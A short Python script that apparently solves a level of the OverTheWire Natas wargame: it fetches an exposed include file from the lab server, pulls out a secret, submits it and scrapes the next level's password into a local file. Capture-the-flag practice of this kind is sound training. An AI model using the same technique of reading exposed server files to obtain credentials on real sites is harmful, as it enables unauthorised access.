from requests import get, post
from sys import argv

next_level = argv[0].split('/')[-1].split('\\')[-1][:-3]

username = f"natas{int(next_level[5:]) - 1}"

# URL identified from provided source
URL = f"http://{username.split('.')[0]}.natas.labs.overthewire.org"

with open(f"./passwords/{username}.pass", 'r') as f:
    password = f.read()

resp = get(f"{URL}/includes/secret.inc", auth=(username, password))

lines = resp.text.split('\n')

# Get secret
for line in lines:
    if "secret" in line:
        secret = line.split('"')[1]
        break


resp = post(URL, data={'secret': secret, 'submit': "Submit+Query"}, auth=(username, password))

lines = resp.text.split('\n')

# Password in page
for line in lines:
    if "natas7" in line:
        new_password = line.split(' ')[7]
        break

print(new_password)

with open(f"./passwords/{next_level}.pass", 'w') as f:
    f.write(new_password)
